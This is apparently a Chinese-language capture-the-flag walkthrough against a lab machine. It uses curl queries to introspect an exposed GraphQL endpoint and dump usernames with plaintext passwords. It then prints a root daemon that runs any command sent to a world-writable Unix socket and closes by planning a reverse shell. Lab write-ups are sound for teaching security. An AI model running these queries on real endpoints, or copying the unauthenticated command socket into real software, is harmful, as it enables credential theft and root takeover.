wbe探测

就这样的一个界面，还给了一个curl命令行

curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.1.17:8888/' \
  --data '{"query":"query { __typename }"}'

先curl一下

┌──(root㉿kali)-[/home/kali/bash]
└─# curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.1.17:8888/' \
  --data '{"query":"query { __typename }"}'
{"data":{"__typename":"Query"}}

向靶机发送了一个GraphQL查询请求，查询了 __typename字段，猜测还有其他信息，接着去curl一下

┌──(root㉿kali)-[~]
└─# curl -X POST http://192.168.1.17:8888/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'
{"data":{"__type":{"name":"User","fields":[{"name":"username","type":{"name":"String"}},{"name":"password","type":{"name":"String"}}]}}}

通过这个命令，可以看到username字段：字符串类型（String），用于存储用户名，password字段：字符串类型（String），用于存储密码

接下来就需要对这两个字段进行查询

┌──(root㉿kali)-[/home/kali/bash]
└─# curl -X POST http://192.168.1.17:8888/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username password } }"}'
{"data":{"users":[{"username":"admin","password":"imtherealadmin"},{"username":"hamelin","password":"comewithmerats"}]}}

这里得到了用户凭证

有一个脚本，看一下内容

flute:/opt/ratd$ cat ratd.py
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
创建一个Unix域套接字服务器，监听在 /tmp/ratd.sock
接受以"RUN "开头的命令
以root权限执行接收到的命令
返回"OK"表示执行成功

那么直接反弹个shell，靶机没有bash，那么用sh来代替
